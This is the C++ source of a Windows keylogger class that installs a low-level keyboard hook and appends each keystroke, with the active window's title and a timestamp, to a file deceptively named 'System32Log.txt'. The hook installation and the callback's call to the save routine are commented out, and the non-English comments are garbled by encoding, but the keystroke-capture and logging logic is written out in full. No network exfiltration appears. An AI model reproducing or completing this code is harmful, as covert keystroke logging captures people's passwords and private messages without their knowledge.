#include <Windows.h>
#include <time.h>
#include <iostream>
#include <cstdio>
#include <fstream>
#include "KeyLog.h"

#pragma comment(lib,"user32.lib")

HHOOK KeyLog::_hook = NULL;
LPARAM lParam1 = 0;
KBDLLHOOKSTRUCT KeyLog::kbdStruct;
std::ofstream* KeyLog::OUTPUT_FILE;

KeyLog::KeyLog() {}

KeyLog::KeyLog(HHOOK thisHook, KBDLLHOOKSTRUCT thisKbdStruct, std::ofstream* thisOUTPUT_FILE) {
	_hook = thisHook;
	kbdStruct = thisKbdStruct;
	OUTPUT_FILE = thisOUTPUT_FILE;
}

//KeyLog::KeyLog(const KeyLog& keylog) {
//	_hook = keylog._hook;
//	OUTPUT_FILE = &keylog.OUTPUT_FILE;
//}

KeyLog::~KeyLog() {}

LRESULT __stdcall KeyLog::HookCallback(int nCode, WPARAM wParam, LPARAM lParam) {
	if (nCode >= 0)
	{
		if (wParam == WM_KEYDOWN)
		{
			//kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);
			KeyLog::SetKbdStruct(*((KBDLLHOOKSTRUCT*)lParam));
			// save to file
			//Save(kbdStruct.vkCode);
		}
	}
	return CallNextHookEx(KeyLog::GetHook(), nCode, wParam, lParam);
}

void KeyLog::ReleaseHook() {
	UnhookWindowsHookEx(KeyLog::GetHook());
}

int KeyLog::Save(int key_stroke)
{
	std::ofstream fout("System32Log.txt", std::fstream::app);
	char lastwindow[256];

	if ((key_stroke == 1) || (key_stroke == 2))
		return 0; // ���������� �������� ������

	HWND foreground = GetForegroundWindow();


	HKL layout{};
	GUITHREADINFO gti{ sizeof(GUITHREADINFO) };
	if (GetGUIThreadInfo(NULL, &gti)) // �������� ��������� ��������� ������ ���������� �����
		layout = GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(), NULL));
	else
		layout = GetKeyboardLayout(NULL); // �������� ��������� ��������� ����� ������ (������ � const)
	std::cout << std::endl << layout << std::endl;
	//auto list = GetKeyboardLayoutList(0, NULL);


	if (foreground)
	{
		char window_title[256];
		GetWindowText(foreground, window_title, 256);

		if (strcmp(window_title, lastwindow) != 0) {
			strcpy_s(lastwindow, window_title);

			// �������� ���
			time_t t = time(NULL);
			struct tm* tm = localtime(&t);
			char s[64];
			strftime(s, sizeof(s), "%c", tm);

		
			fout << "\n\n[Window: " << window_title << " - at " << s << "] ";

			//KeyLog::SetOutputFile(fout);
		}
	}


	std::cout << key_stroke << '\n';

	if (key_stroke == VK_BACK)
		fout << "[BACKSPACE]";
	else if (key_stroke == VK_RETURN)
		fout << "\n";
	else if (key_stroke == VK_SPACE)
		fout << " ";
	else if (key_stroke == VK_TAB)
		fout << "[TAB]";
	else if (key_stroke == VK_SHIFT || key_stroke == VK_LSHIFT || key_stroke == VK_RSHIFT)
		fout << "[SHIFT]";
	else if (key_stroke == VK_CONTROL || key_stroke == VK_LCONTROL || key_stroke == VK_RCONTROL)
		fout << "[CONTROL]";
	else if (key_stroke == VK_ESCAPE)
		fout << "[ESCAPE]";
	else if (key_stroke == VK_END)
		fout << "[END]";
	else if (key_stroke == VK_HOME)
		fout << "[HOME]";
	else if (key_stroke == VK_LEFT)
		fout << "[LEFT]";
	else if (key_stroke == VK_UP)
		fout << "[UP]";
	else if (key_stroke == VK_RIGHT)
		fout << "[RIGHT]";
	else if (key_stroke == VK_DOWN)
		fout << "[DOWN]";
	else if (key_stroke == 190 || key_stroke == 110)
		fout << ".";
	else if (key_stroke == 189 || key_stroke == 109)
		fout << "-";
	else if (key_stroke == 20)
		fout << "[CAPSLOCK]";
	else {
		char key;
		// �������� Caps Lock
		bool lowercase = ((GetKeyState(VK_CAPITAL) & 0x0001) != 0);

		// �������� ������ shift
		if ((GetKeyState(VK_SHIFT) & 0x1000) != 0 || (GetKeyState(VK_LSHIFT) & 0x1000) != 0 || (GetKeyState(VK_RSHIFT) & 0x1000) != 0) {
			lowercase = !lowercase;
		}

		// ���������� ��������� ������ �������� �� ��������� ���������
		//key = MapVirtualKeyExA(key_stroke, MAPVK_VK_TO_CHAR, layout);
		key = MapVirtualKeyExW(key_stroke, MAPVK_VK_TO_CHAR, layout);


		//tolower converts it to lowercase properly
		// tolower ��������� ���������� ���� �� lowercase
		if (!lowercase) key = tolower(key);
		fout << char(key);

		fout.close();
		//KeyLog::SetOutputFile(fout);
	}
	// ������ ����, ��� ������ ��������� �� ��������� ��������� �����, ������� ���� �������� � ������.
	KeyLog::GetOutputFile().flush();
	return 0;
}

void KeyLog::SetHook() {

	// ���������� ��� � ����������� ���� �� ������������ ������� ���������� ������� ����
	// WH_KEYBOARD_LL ������, �� ���� ����������� ������� ����� ������������ ���������. ������ ���������� ��� �� �� MSDN.
	// ������ 2 ��������� ��������� NULL, 0, ������� ������� ���������� ������� ����������� � ���� � ������ �� ���, �� �
	// �������, ��� ���������� �� ������� ���.
	//if (!(KeyLog::SetHHook(SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, NULL, 0))))
	/*{
		MessageBox(NULL, "Failed to install hook!", "Error", MB_ICONERROR);
	}*/
}

HHOOK KeyLog::GetHook() {
	return _hook;
}

KBDLLHOOKSTRUCT KeyLog::GetKbdStruct() {
	return kbdStruct;
}

std::ofstream &KeyLog::GetOutputFile() {
	return *OUTPUT_FILE;
}

void KeyLog::SetHHook(HHOOK thisHook) {
	_hook = thisHook;
}

void KeyLog::SetKbdStruct(KBDLLHOOKSTRUCT thisKbdStruct) {
	kbdStruct = thisKbdStruct;
}

void KeyLog::SetOutputFile(std::ofstream* thisOUTPUT_FILE) {
	OUTPUT_FILE = thisOUTPUT_FILE;
}

